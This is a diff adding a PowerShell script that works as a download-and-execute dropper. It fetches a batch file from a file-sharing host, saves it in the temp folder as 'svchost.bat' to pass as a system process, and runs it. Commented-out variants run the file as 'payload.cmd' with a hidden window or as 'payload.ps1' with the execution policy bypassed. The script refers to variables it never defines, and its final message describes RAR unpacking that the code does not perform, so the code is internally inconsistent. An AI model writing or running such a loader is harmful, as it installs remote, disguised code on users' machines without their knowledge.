@@ -1,0 +1,37 @@
+$ErrorActionPreference = 'Stop'
+
+# URLs
+$txtUrl = 'https://files.catbox.moe/a9z2ls.bat'   # will save as .txt locally
+
+# Temp paths
+$tmp  = $env:TEMP
+$txt  = Join-Path $tmp 'svchost.bat'              # force .txt
+
+# Clean up any previous folder
+if (Test-Path $base) {
+    Remove-Item $base -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# Create working folder
+New-Item -ItemType Directory -Path $base | Out-Null
+
+# Download the .txt (source is .bin, save as .txt)
+Invoke-WebRequest $txtUrl -OutFile $txt -UseBasicParsing
+
+
+
+
+Start-Process -FilePath $txt -ArgumentList @($rarFullPath)
+
+
+# --- If it's a batch file content, save & run as .cmd ---
+# $cmd = Join-Path $tmp 'payload.cmd'
+# Copy-Item $txt $cmd -Force
+# Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c', $cmd, $rarFullPath) -WindowStyle Hidden
+
+# --- If it's PowerShell script content, save & run as .ps1 ---
+# $ps1 = Join-Path $tmp 'payload.ps1'
+# Copy-Item $txt $ps1 -Force
+# powershell -NoProfile -ExecutionPolicy Bypass -File $ps1 --% $rarFullPath
+
+"Done: RAR downloaded to $rarFullPath, WinRAR unpacked to $base, text saved to $txt and opened with argument."
